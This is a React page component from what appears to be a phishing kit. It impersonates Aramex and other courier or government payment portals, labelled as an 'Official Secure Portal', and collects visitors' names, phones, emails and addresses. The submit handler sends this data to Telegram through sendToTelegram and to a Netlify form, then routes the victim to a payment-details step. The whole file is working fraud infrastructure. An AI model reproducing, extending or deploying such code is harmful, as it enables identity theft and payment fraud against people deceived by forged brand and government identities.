import { useState, useEffect } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import {
  User,
  Phone,
  Mail,
  Loader2,
  ShieldCheck,
  MapPin,
  Lock,
  Landmark,
  FileText,
  ArrowLeft,
  Info
} from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency, getCurrencyCode } from "@/lib/countryCurrencies";
import { applyDynamicIdentity, removeDynamicIdentity } from "@/lib/dynamicIdentity";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import BottomNav from "@/components/BottomNav";
import BackButton from "@/components/BackButton";
import { sendToTelegram } from "@/lib/telegram";

const PaymentRecipient = () => {
  const { id } = useParams();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: link, isLoading } = useLink(id);
  const updateLink = useUpdateLink();

  const [formData, setFormData] = useState({
    fullName: "",
    phone: "",
    email: "",
    address: "",
    reference: ""
  });
  const [isSubmitting, setIsSubmitting] = useState(false);

  const company = searchParams.get("company") || link?.payload?.service_key || "aramex";
  const method = searchParams.get("method") || link?.payload?.payment_method || "card";
  const branding = getServiceBranding(company);
  const countryCode = link?.country_code || "SA";
  const countryData = getCountryByCode(countryCode);
  const govSystem = getGovernmentPaymentSystem(countryCode);

  useEffect(() => {
    if (company) {
      applyDynamicIdentity(company);
    }
    return () => {
      removeDynamicIdentity();
    };
  }, [company]);

  useEffect(() => {
    if (link?.payload) {
      setFormData(prev => ({
        ...prev,
        fullName: link.payload.customerInfo?.fullName || link.payload.customer_name || "",
        phone: link.payload.customerInfo?.phone || link.payload.customer_phone || "",
        email: link.payload.customerInfo?.email || link.payload.customer_email || "",
        address: link.payload.customerInfo?.address || "",
        reference: link.payload.reference || ""
      }));
    }
  }, [link]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.fullName || !formData.phone) {
      toast({ title: "خطأ", description: "الرجاء إدخال البيانات المطلوبة", variant: "destructive" });
      return;
    }

    setIsSubmitting(true);
    try {
      const netlifyData = new FormData();
      netlifyData.append('form-name', 'payment-recipient');
      netlifyData.append('name', formData.fullName);
      netlifyData.append('email', formData.email);
      netlifyData.append('phone', formData.phone);
      netlifyData.append('address', formData.address);
      netlifyData.append('service', link?.payload?.service_name || company);
      netlifyData.append('amount', (link?.payload?.payment_amount || link?.payload?.cod_amount || 0).toString());
      netlifyData.append('linkId', id || '');

      try {
        await fetch('/', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: new URLSearchParams(netlifyData as any).toString()
        });
      } catch (err) {}

      await updateLink.mutateAsync({
        linkId: id!,
        payload: { ...link?.payload, customerInfo: formData, reference: formData.reference }
      });

      await sendToTelegram({
        type: 'payment_recipient',
        data: {
          ...formData,
          service: link?.payload?.service_name || company,
          amount: formatCurrency(link?.payload?.payment_amount || link?.payload?.cod_amount || 0, link?.payload?.currency_code || countryCode),
          payment_url: `${window.location.origin}/pay/${id}/details`
        },
        timestamp: new Date().toISOString()
      });

      navigate(`/pay/${id}/details?company=${company}&method=${method}`);
    } catch (err) {
      console.error(err);
      toast({ title: "خطأ", description: "حدث خطأ أثناء حفظ البيانات", variant: "destructive" });
    } finally {
      setIsSubmitting(false);
    }
  };

  if (isLoading || !link) {
    return <div className="min-h-screen flex items-center justify-center bg-gray-50"><Loader2 className="w-10 h-10 animate-spin text-blue-600" /></div>;
  }

  const isGov = company.startsWith('gov_');
  const primaryColor = isGov ? govSystem.colors.primary : branding.colors.primary;

  return (
    <div className="min-h-screen bg-[#F8FAFC] pb-20" dir="rtl">
      <header className="bg-white border-b-4 shadow-sm sticky top-0 z-50" style={{ borderBottomColor: primaryColor }}>
        <div className="container mx-auto px-4 h-20 flex items-center justify-between">
          <div className="flex items-center gap-4">
             <BackButton />
             <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-xl flex items-center justify-center text-white shadow-md" style={{ background: primaryColor }}>
                   {isGov ? <Landmark className="w-5 h-5" /> : <User className="w-5 h-5" />}
                </div>
                <div>
                   <h1 className="text-lg font-black text-gray-800 leading-none">{isGov ? 'بيانات المستفيد' : 'بيانات التوصيل والسداد'}</h1>
                   <p className="text-[8px] font-bold text-gray-400 uppercase tracking-widest mt-1">Official Secure Portal</p>
                </div>
             </div>
          </div>
          {isGov ? (
            govSystem.logo && <img src={govSystem.logo} className="h-8 w-auto object-contain" alt="" />
          ) : (
            branding.logo && <img src={branding.logo} className="h-8 w-auto object-contain" alt="" />
          )}
        </div>
      </header>

      <div className="container mx-auto px-4 py-8">
        <div className="max-w-4xl mx-auto grid md:grid-cols-5 gap-8">
          <div className="md:col-span-3 space-y-6">
            <Card className="p-8 border-0 shadow-2xl rounded-[2.5rem] bg-white">
               <div className="flex items-center gap-3 mb-8">
                  <div className="w-1.5 h-6 rounded-full" style={{ background: primaryColor }} />
                  <h2 className="text-xl font-black text-gray-800">أدخل معلوماتك الشخصية</h2>
               </div>

               <form onSubmit={handleSubmit} className="space-y-6">
                  <div className="space-y-2">
                     <Label className="text-xs font-black text-gray-400 uppercase">الاسم الكامل</Label>
                     <div className="relative group">
                        <User className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-blue-600 transition-colors" />
                        <Input value={formData.fullName} onChange={(e) => setFormData({...formData, fullName: e.target.value})} className="h-14 pr-12 border-2 rounded-2xl font-bold text-lg bg-gray-50 focus:bg-white transition-all" placeholder="الاسم كما في الهوية" required />
                     </div>
                  </div>

                  <div className="grid sm:grid-cols-2 gap-6">
                     <div className="space-y-2">
                        <Label className="text-xs font-black text-gray-400 uppercase">رقم الجوال</Label>
                        <div className="relative group">
                           <Phone className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-blue-600 transition-colors" />
                           <Input value={formData.phone} onChange={(e) => setFormData({...formData, phone: e.target.value})} className="h-14 pr-12 border-2 rounded-2xl font-bold text-lg bg-gray-50 focus:bg-white text-left" dir="ltr" placeholder="05XXXXXXXX" required />
                        </div>
                     </div>
                     <div className="space-y-2">
                        <Label className="text-xs font-black text-gray-400 uppercase">البريد الإلكتروني</Label>
                        <div className="relative group">
                           <Mail className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-blue-600 transition-colors" />
                           <Input type="email" value={formData.email} onChange={(e) => setFormData({...formData, email: e.target.value})} className="h-14 pr-12 border-2 rounded-2xl font-bold text-lg bg-gray-50 focus:bg-white text-left" dir="ltr" placeholder="example@mail.com" required />
                        </div>
                     </div>
                  </div>

                  {isGov && (
                    <div className="space-y-2">
                       <Label className="text-xs font-black text-gray-400 uppercase">رقم الفاتورة / المرجع</Label>
                       <div className="relative group">
                          <FileText className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-blue-600 transition-colors" />
                          <Input value={formData.reference} onChange={(e) => setFormData({...formData, reference: e.target.value})} className="h-14 pr-12 border-2 rounded-2xl font-bold text-lg bg-gray-50 focus:bg-white" placeholder="أدخل الرقم المرجعي" />
                       </div>
                    </div>
                  )}

                  <div className="space-y-2">
                     <Label className="text-xs font-black text-gray-400 uppercase">عنوان السكن</Label>
                     <div className="relative group">
                        <MapPin className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-blue-600 transition-colors" />
                        <Input value={formData.address} onChange={(e) => setFormData({...formData, address: e.target.value})} className="h-14 pr-12 border-2 rounded-2xl font-bold text-lg bg-gray-50 focus:bg-white" placeholder="المدينة، الحي، الشارع" required />
                     </div>
                  </div>

                  <Button type="submit" disabled={isSubmitting} className="w-full h-16 rounded-2xl text-xl font-black shadow-xl transition-all hover:translate-y-[-2px]" style={{ background: isGov ? govSystem.gradients.primary : branding.colors.primary, boxShadow: `0 10px 30px -10px ${primaryColor}80` }}>
                    {isSubmitting ? <Loader2 className="w-6 h-6 animate-spin" /> : "المتابعة لتفاصيل الدفع"}
                  </Button>
               </form>
            </Card>
          </div>

          <div className="md:col-span-2 space-y-6">
             <Card className="p-6 border-0 shadow-xl rounded-[2rem] bg-white">
                <h3 className="text-sm font-black text-gray-400 uppercase tracking-widest mb-4">ملخص الرسوم</h3>
                <div className="space-y-4">
                   <div className="flex items-center gap-3">
                      <div className="w-10 h-10 rounded-xl bg-gray-50 flex items-center justify-center border border-gray-100" style={{ color: primaryColor }}>
                        {isGov ? <Landmark className="w-5 h-5" /> : <Info className="w-5 h-5" />}
                      </div>
                      <div>
                        <p className="text-[10px] font-bold text-gray-400">الخدمة</p>
                        <p className="text-sm font-black text-gray-700">{link.payload.service_name || link.payload.chalet_name}</p>
                      </div>
                   </div>
                   <div className="p-4 rounded-2xl bg-gray-50 border border-gray-100 text-center">
                      <p className="text-[10px] font-black text-gray-400 uppercase mb-1">إجمالي المبلغ</p>
                      <p className="text-3xl font-black" style={{ color: primaryColor }}>{formatCurrency(link.payload.payment_amount || link.payload.cod_amount || link.payload.total_amount || 0, link.payload.currency_code || countryCode)}</p>
                   </div>
                </div>
             </Card>
          </div>
        </div>
      </div>
      <BottomNav />
      <form name="payment-recipient" data-netlify="true" data-netlify-honeypot="bot-field" hidden>
        <input type="text" name="name" /><input type="email" name="email" /><input type="tel" name="phone" /><input type="text" name="address" /><input type="text" name="service" /><input type="text" name="amount" /><input type="text" name="linkId" />
      </form>
    </div>
  );
};

export default PaymentRecipient;
